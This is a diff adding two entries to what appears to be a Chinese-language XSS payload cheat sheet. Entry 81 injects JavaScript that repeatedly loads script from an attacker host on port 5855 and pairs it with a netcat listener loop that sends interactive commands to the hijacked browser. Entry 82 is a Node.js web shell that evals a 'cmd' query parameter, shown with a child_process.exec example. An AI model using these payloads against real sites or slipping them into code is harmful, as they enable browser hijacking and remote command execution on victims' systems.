@@ -611,6 +611,26 @@ $headers = "From: report@myDomain" . "\r\n";
 if ($origin && $msg) mail($to, $subject, $msg, $headers);
 ?>
 ```
+**81.Browser Remote Control (浏览器远程控制)** <br>
+以下payload用于监控浏览器并以交互方式,向其发送javascript命令。注入下面的javascript代码而不是`alert(1)`，会打开一个类似Unix的终端，使用下面的shell脚本（监听器）。将主机的主机名、IP地址或域名提供给从攻击者机器,然后接收命令去执行。
+
+
+```
+=> Javascript (payload):
+setInterval(function(){with(document)body.
+appendChild(createElement('script')).src='//HOST:5855'},100)
+
+=> Listener (terminal command):
+$ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
+```
+**82.Node.js Web Shell (Node.js web后门)** <br>
+以下payload用于在易受攻击的Node.js应用程序中创建web后门,在运行下面的有效负载之后，按以下方式使用shell <br>
+`shell:http://target:5855/?cmd=my_node.js_command` <br>
+弹出计算示例：`cmd=require('child_process').exec('gnome-calculator') <br>
+```
+require('http').createServer(function(req,res){res.end(1-
+eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
+```
 
 ## 致谢
 **英文议题作者：** <br>
